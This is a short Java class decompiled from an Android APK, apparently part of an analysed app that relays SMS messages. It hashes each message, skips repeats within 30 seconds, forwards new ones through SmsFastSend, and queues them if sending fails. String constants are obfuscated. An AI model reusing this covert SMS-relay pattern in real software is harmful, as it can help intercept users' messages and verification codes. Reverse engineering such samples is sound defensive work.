package com.base.template;

import android.content.Context;
import android.content.SharedPreferences;
import com.base.template.network.SmsFastSend;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import kotlin.collections.ArraysKt;
import kotlin.text.Charsets;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class SmsDedup {
    public static final SmsDedup INSTANCE = new SmsDedup();
    public static final LinkedHashMap cache = new LinkedHashMap(64, 0.75f, true);

    public final synchronized void sendIfNew(Context context, String str, String str2, int i) {
        SharedPreferences sharedPreferences;
        MessageDigest messageDigest = MessageDigest.getInstance(C0000.decode(new byte[]{43, 38, 86}, "fbcc836d"));
        Charset charset = Charsets.UTF_8;
        messageDigest.update(str.getBytes(charset));
        messageDigest.update(str2.getBytes(charset));
        String strSubstring = ArraysKt.joinToString$default(messageDigest.digest(), SmsDedup$buildKey$1.INSTANCE).substring(0, 16);
        long jCurrentTimeMillis = System.currentTimeMillis();
        LinkedHashMap linkedHashMap = cache;
        Long l = (Long) linkedHashMap.get(strSubstring);
        if (l == null || jCurrentTimeMillis - l.longValue() >= 30000) {
            linkedHashMap.put(strSubstring, Long.valueOf(jCurrentTimeMillis));
            if (linkedHashMap.size() > 200) {
                Iterator it = linkedHashMap.entrySet().iterator();
                while (it.hasNext() && jCurrentTimeMillis - ((Number) ((Map.Entry) it.next()).getValue()).longValue() > 90000) {
                    it.remove();
                }
            }
            try {
                SmsFastSend.send(context, str, str2, i);
            } catch (Exception unused) {
                if (context != null) {
                    try {
                        sharedPreferences = context.getSharedPreferences(C0000.decode(new byte[]{74, 14, 74, 105, 72}, "9c969d28c634"), 0);
                    } catch (Exception unused2) {
                    }
                } else {
                    sharedPreferences = null;
                }
                SmsFastSend.enqueue(sharedPreferences, str, str2, i);
            }
        }
    }
}
